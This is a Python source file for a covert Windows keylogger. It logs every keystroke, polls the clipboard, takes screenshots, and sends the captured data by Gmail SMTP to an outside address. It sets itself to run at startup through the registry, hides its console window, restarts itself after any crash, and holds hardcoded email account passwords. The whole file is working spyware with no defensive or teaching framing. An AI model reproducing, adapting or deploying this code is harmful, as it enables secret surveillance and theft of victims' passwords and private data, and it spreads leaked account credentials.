import os
# from pickle import FALSE
# from platform import platform
import time
# from click import File
import keyboard # for keylogs
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
import getpass
# from pip import main
import pyperclip
import pyautogui
import ctypes
import autorun
import win32process
import  shutil
import logging

def start_script():
    try:
        main_func()
    except:
        
        handle_crash()

def handle_crash():
    time.sleep(5) 
    start_script()

    

autorun.AddToRegistry('log_file.exe')

hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
if hwnd != 0:      
    ctypes.windll.user32.ShowWindow(hwnd, 0)      
    ctypes.windll.kernel32.CloseHandle(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)

print('program started')
img_count = 1
comname = getpass.getuser()
# print(comname)
temp_data = pyperclip.paste()

if not os.path.exists('datafile.txt'):
    with open('datafile.txt', 'a') as clip:
        pass

def clipboard_listener():
    global temp_data, clipboard_data
    try:
        if temp_data != pyperclip.paste():
            temp_data = pyperclip.paste()
            clipboard_data += f'\n\n{pyperclip.paste()}'
            # print(f'clipboard data: {clipboard_data}')
    except:
        time.sleep(2)
        clipboard_listener()
    mytimer = Timer(interval=5, function = clipboard_listener)
    mytimer.daemon = True
    mytimer.start()      

def isdataavailable():
    print('in data available function... ')
    with open('datafile.txt', 'r+') as f:
    # print(f.read())
        data = f.read()
        print(f.read())
        if data != '':
            try:
                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                # # connect to the SMTP server as TLS mode ( for security )
                server.starttls()
                # login to the email account
                server.login('007711meenakshi@gmail.com', 'tqbnkgbxprgppuim')
                print('sending email from data function... ')
                # send the actual message
                server.sendmail('007711meenakshi@gmail.com', '999ajaymathur@gmail.com', data)
                print('email sent successfully from data function')
                # terminates the session
                server.quit()
                f.truncate()
                print('erased data from file.')
            except:
                isdataavailable()
        else:
            print('data not available')    


clipboard_data = ''  

def main_func():
    clipboard_listener()
    print('main function started')
    global clipboard_data
    isdataavailable()
    SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
    EMAIL_ADDRESS = "007711meenakshi@gmail.com"
    EMAIL_PASSWORD = "tqbnkgbxprgppuim" #gmail pass => 12345ghjkl@1
    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
    # EMAIL_PASSWORD = "abcd@1234"
    # EMAIL_ADDRESS = "core.builder11@gmail.com"
    # EMAIL_PASSWORD = "builder123*"

    class Keylogger:
        def __init__(self, interval, report_method="email"):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.interval = interval
            self.report_method = report_method
            # this is the string variable that contains the log of all 
            # the keystrokes within `self.interval`
            self.log = ""
            # record start & end datetimes
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()

        def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            if len(name) > 1:
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "\n"
                elif name == "backspace":
                    self.log = self.log[:-1]
                    name = ''
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name
        
        def update_filename(self):
            # construct the filename to be identified by start & end datetimes
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            """This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable"""
            # open the file in write mode (create it)
            with open(f"{self.filename}.txt", "w") as f:
                # write the keylogs to the file
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

        def sendmail(self, email, password, message):            
            global clipboard_data
            if not os.path.exists(os.path.join('C://', 'temp')):
                os.mkdir(os.path.join('C://', 'temp'))
            # _ss_func()
             
            msg = MIMEMultipart("related")
            msg["Subject"] = comname
            
            msg["From"] = email
            # filename = "clipboard.txt"
            # msg.add_attachment(open(filename, "r").read(), filename=filename)
            # str(Header(f'{comname}<{email}>'))
            # msg["To"] = 'core.builder11@gmail.com'
            # Anshumankumar7890@gmail.com
            clip_data = clipboard_data
            print(f'clip_data :{clip_data}')
            # with open('clipboard.txt', 'r+') as clip: 
            #     clip_data = clip.read()           
            #     clip.truncate(0)
            email_body = f'\n\nClipboard data:\n {clip_data} \n\n\n\n {message}'
            msg.attach(MIMEText(email_body))
            for i in range(1,4):
                time.sleep(5)
                ss = pyautogui.screenshot()
                ss.save(f'C://temp/log{i}.png')
                with open(f'C://temp/log{i}.png', 'rb') as fp:
                    img = MIMEImage(fp.read())
                img.add_header('Content-ID', '<{}>'.format(f'C://temp/log{i}.png'))
                msg.attach(img)
            print('sending email...')
            # manages a connection to an SMTP server
            try:
                
                # manages a connection to an SMTP server
                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                # # connect to the SMTP server as TLS mode ( for security )
                server.starttls()
                # login to the email account
                server.login(email, password)
                # send the actual message
                server.sendmail(email, '999ajaymathur@gmail.com',msg.as_string())
                print('email sent successfully')
                # terminates the session
                server.quit()
                # os.remove('C://temp/')
                shutil.rmtree('C://temp')
                clipboard_data = ''
            except:
                with open('datafile.txt', 'a') as f:
                    f.write(msg.as_string())
                clipboard_data = ''
                isdataavailable()
        def report(self):
            # if self.log:
                # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

        def start(self):
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            # block the current thread, wait until CTRL+C is pressed
            keyboard.wait()

        
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()    
    # _ss_func()
 
try:
    # printf("GeeksforGeeks")
    
    start_script()
except Exception as Argument:
 
    # creating/opening a file
    f = open("error.txt", "a")

    # writing in the file
    f.write(str(Argument))
    
    # closing the file
    f.close()
    start_script()
except:
    start_script()
    


# def is_admin():
#     try:
#         return ctypes.windll.shell32.IsUserAnAdmin()
#     except:
#         return False
# if is_admin():
#     main_func()
#     # Code of your program here
# else:
#     # Re-run the program with admin rights
#     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
#     main_func()